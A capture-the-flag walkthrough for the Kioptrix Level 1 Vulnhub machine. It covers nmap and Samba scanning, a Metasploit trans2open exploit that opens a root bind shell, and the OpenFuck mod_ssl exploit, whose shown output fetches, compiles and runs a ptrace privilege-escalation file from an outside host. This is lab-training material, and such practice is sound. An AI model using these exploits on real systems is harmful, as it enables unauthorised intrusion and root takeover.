---

title: KIOPTRIX LEVEL 1 (#1) - Vulnhub Walkthrough
date: 2021-07-19 09:46:00 +0200
categories: [VlunHub]
tags: [vulnhub, kioptrix, easy, smb]     

---

# Introduction

This Kioptrix: Level 1 VM Image is rated as **Easy/Beginner** level challenge. The objective of the game is to acquire root access via any means possible. The purpose of the game is to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges.
It was created by [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)
Other machines in the series can be found in the [Kioptrix](https://www.vulnhub.com/series/kioptrix,8/) series page on Vulnhub.



# Scanning

We first need to get the target IP. in my case network sittings was bridged so i run `sudo netdisover`

to catch all ip in my network => kioprix ip is `192.168.1.7`

you can use nmap to catch your ip using `-sP` flag

## nmap 

`sudo nmap -sV -p- -O -T4 192.168.1.7`

- `-sV` determine service/version info
- `-T4` for faster execution
- `-p-` scan all ports
- `-O` identify Operating System

```console
tarting Nmap 7.91 ( https://nmap.org ) at 2021-07-19 04:06 EDT
Nmap scan report for 192.168.1.7
Host is up (0.0011s latency).
Not shown: 65529 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)
80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
1024/tcp open  status      1 (RPC #100024)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 2 hops

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.38 seconds
```



nmap can't identify `SMB`  version lets do it on our own

1. Using [enum4linux](https://tools.kali.org/information-gathering/enum4linux) `enum4linux`

2. Using [smbclient](https://tldp.org/HOWTO/SMB-HOWTO-8.html) `smbclient -L`

3. Using [metasploit](https://www.metasploit.com/)

   ```console
   ➜  ~ msfconsole 
   msf6 > search smb version scanner
   
   Matching Modules
   ================
   
      #  Name                               Disclosure Date  Rank    Check  Description
      -  ----                               ---------------  ----    -----  -----------
      0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection
   
   
   Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/smb/smb_version
   
   msf6 > use 0
   msf6 auxiliary(scanner/smb/smb_version) > options 
   
   Module options (auxiliary/scanner/smb/smb_version):
   
      Name     Current Setting  Required  Description
      ----     ---------------  --------  -----------
      RHOSTS                    yes       The target host(s), range CIDR identifier, or hosts file with sy
                                          ntax 'file:<path>'
      THREADS  1                yes       The number of concurrent threads (max one per host)
   
   msf6 auxiliary(scanner/smb/smb_version) > set rhosts 192.168.1.7
   rhosts => 192.168.1.7
   msf6 auxiliary(scanner/smb/smb_version) > exploit
   
   [*] 192.168.1.7:139       - SMB Detected (versions:) (preferred dialect:) (signatures:optional)
   [*] 192.168.1.7:139       -   Host could not be identified: Unix (Samba 2.2.1a)
   [*] 192.168.1.7:          - Scanned 1 of 1 hosts (100% complete)
   [*] Auxiliary module execution completed
   ```

   Now we have the SMB version - **Samba 2.2.1a**



# Gaining Access

after some `googling` i found these exploit

you can use `search sploit` in terminal too .

## Method 1: Samba trans2open Overflow (Linux x86)

now fire `msfconsole` searching for **trans2open**

```console
msf6 > search trans2open

Matching Modules
================

   #  Name                              Disclosure Date  Rank   Check  Description
   -  ----                              ---------------  ----   -----  -----------
   0  exploit/freebsd/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
   1  exploit/linux/samba/trans2open    2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
   2  exploit/osx/samba/trans2open      2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
   3  exploit/solaris/samba/trans2open  2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)


Interact with a module by name or index. For example info 3, use 3 or use exploit/solaris/samba/trans2open

msf6 > use 1
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(linux/samba/trans2open) > show payloads 

Compatible Payloads
===================

   #   Name                                              Disclosure Date  Rank    Check  Description
   -   ----                                              ---------------  ----    -----  -----------
   0   payload/generic/custom                                             normal  No     Custom Payload
   1   payload/generic/debug_trap                                         normal  No     Generic x86 Debug Trap
	...
   29  payload/linux/x86/shell_bind_ipv6_tcp                              normal  No     Linux Command Shell, Bind TCP Inline
   30  payload/linux/x86/shell_bind_tcp                                   normal  No     Linux Command Shell, Bind TCP Inline

msf6 exploit(linux/samba/trans2open) > set payload 30
payload => linux/x86/shell_bind_tcp
msf6 exploit(linux/samba/trans2open) > options

Module options (exploit/linux/samba/trans2open):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syn
                                      tax 'file:<path>'
   RPORT   139              yes       The target port (TCP)


Payload options (linux/x86/shell_bind_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LPORT  4444             yes       The listen port
   RHOST                   no        The target address


Exploit target:

   Id  Name
   --  ----
   0   Samba 2.2.x - Bruteforce


msf6 exploit(linux/samba/trans2open) > set rhost 192.168.1.7
rhost => 192.168.1.7
msf6 exploit(linux/samba/trans2open) > exploit

[*] 192.168.1.7:139 - Trying return address 0xbffffdfc...
[*] Started bind TCP handler against 192.168.1.7:4444
[*] 192.168.1.7:139 - Trying return address 0xbffffcfc...
[*] 192.168.1.7:139 - Trying return address 0xbffffbfc...
[*] 192.168.1.7:139 - Trying return address 0xbffffafc...
[*] 192.168.1.7:139 - Trying return address 0xbffff9fc...
[*] 192.168.1.7:139 - Trying return address 0xbffff8fc...
[*] Command shell session 1 opened (0.0.0.0:0 -> 192.168.1.7:4444) at 2021-07-19 04:26:53 -0400

whoami
root
uname -a
Linux kioptrix.level1 2.4.7-10 #1 Thu Sep 6 16:46:36 EDT 2001 i686 unknown
```

- [x] Gain root access to the machine



## Method 2: OpenFuck mod_ssl vulnerability

nmap output we find **mod_ssl/2.8.4**   

lets use searchsploit this time

```console
➜  ~ searchsploit mod_ssl
---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Apache mod_ssl 2.0.x - Remote Denial of Servi | linux/dos/24590.txt
Apache mod_ssl 2.8.x - Off-by-One HTAccess Bu | multiple/dos/21575.txt
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' | unix/remote/21671.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2. | unix/remote/47080.c
Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2. | unix/remote/764.c
Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-bet | unix/remote/40347.txt
---------------------------------------------- ---------------------------------
Shellcodes: No Results
```

most suitable one is **Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2. | unix/remote//usr/share/exploitdb/exploits/unix/remote/47080.c.c**

```console
➜  ~ searchsploit -p 47080                                
  Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
      URL: https://www.exploit-db.com/exploits/47080
     Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
File Type: C source, ASCII text, with CRLF line terminators
```

to copy exploit to current directory

```console
➜  ~ searchsploit -m 47080
```

use head to display first 10 line of exploit which contains how to run exploit

```console
➜  ~ head 47080.c      
/*
 * OF version r00t VERY PRIV8 spabam
 * Version: v3.0.4 
 * Requirements: libssl-dev    ( apt-get install libssl-dev )
 * Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto
 * objdump -R /usr/sbin/httpd|grep free to get more targets
 * #hackarena irc.brasnet.org
 * Note: if required, host ptrace and replace wget target
 */

```

now we know how to use `Compile with: gcc -o OpenFuck OpenFuck.c -lcrypto`

don't forget the requirements  `sudo apt-get install libssl-dev`

```console
➜  ~ ./OpenFuck   

*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

: Usage: ./OpenFuck target box [port] [-c N]

  target - supported box eg: 0x00
  box - hostname or IP address
  port - port for ssl connection
  -c open N connections. (use range 40-50 if u dont know)
  

  Supported OffSet:
	0x00 - Caldera OpenLinux (apache-1.3.26)
	...
	0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
	0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
	...

#&$@ to all guys who like use lamah ddos. Read SRC to have no surprise
```

What we need:

1. **target** -offset value from the list

   From our nmap scan we know the service version is: “Apache httpd 1.3.20 ((Unix) (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)”.

   Looking for Red-Hat and 1.3.20 versions leave us with two options:

   - **0x6a** - RedHat Linux 7.2 (apache-1.3.20-16)1
   - **0x6b** - RedHat Linux 7.2 (apache-1.3.20-16)2

2. **box** - target’s IP - ‘kioptrix’ in our case

3. **port** - HTTP port - 443 in our case

4. **Number of connection** to open (range of 40-50) - We’ll go with 40

Therefore the complete command we’ll use: `./Openfuck 0x6b kioptrix 443 -c 40`:

```console
➜  ~ ./OpenFuck 0x6b kioptrix 443 -c 40
*******************************************************************
* OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
*******************************************************************
* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *
* #hackarena  irc.brasnet.org                                     *
* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *
* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *
* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *
*******************************************************************

Connection... 40 of 40
Establishing SSL connection
cipher: 0x4043808c   ciphers: 0x80fa068
Ready to send shellcode
Spawning shell...
bash: no job control in this shell
bash-2.05$ 
d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo 
--20:52:11--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
           => `ptrace-kmod.c'
Connecting to dl.packetstormsecurity.net:443... connected!
HTTP request sent, awaiting response... 200 OK
Length: 3,921 [text/x-csrc]

20:52:12 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]

gcc: file path prefix `/usr/bin' never used
[+] Attached to 12590
[+] Waiting for signal
[+] Signal caught
[+] Shellcode placed at 0x4001189d
[+] Now wait for suid shell...
whoami
root
```

- [x] Gain root access to the machine



# Capture The Flag

Once we have a ***shell\*** using on of the above methods, we need to spawn a TTY shell. `/bin/bash -i` is used to get active ***bash shell\***. You can find other options on the post Summary below.

Let’s look at the user’s commands history:

```console
➜  ~ history
history
    1  ls    
    2  mail    
    3  mail    
    4  clear    
    5  echo "ls" > .bash_history && poweroff    
    6  nano /etc/issue    
    7  pico /etc/issue    
    8  pico /etc/issue    
    9  ls   
    10  clear   
    11  ls /home/   
    12  exit   
    13  ifconfig   
    14  poweroff   
    15  history 
```

The mail command might be intresting. We can access mail using `mail` command interacting with it (selecting what message to read) using message number (Use `exit` to leave the mail)

```
➜  ~ mail
mail 
Mail version 8.1 6/6/93.  Type ? for help.
"/var/mail/root": 2 messages 1 new 2 unread
U  1 root@kioptix.level1   Sat Sep 26 11:42  15/481   "About Level 2" 
>N  2 root@kioptrix.level1  Fri Jan 15 18:08  18/524   "LogWatch for kioptrix" 

1
Message 1:
From root  Sat Sep 26 11:42:10 2009 
Date: Sat, 26 Sep 2009 11:42:10 -0400
From: root <root@kioptix.level1> 
To: root@kioptix.level1 
Subject: About Level 2 

If you are reading this, you got root. Congratulations.
Level 2 won't be as easy... 

2
Message 2: From root  Fri Jan 15 18:08:41 2021 
Date: Fri, 15 Jan 2021 18:08:41 -0500 
From: root <root@kioptrix.level1> 
To: root@kioptrix.level1 
Subject: LogWatch for kioptrix.level1
################## LogWatch 2.1.1 Begin ##################### 

###################### LogWatch End #########################  
```

That’s our flag!

- [x] Capture the flag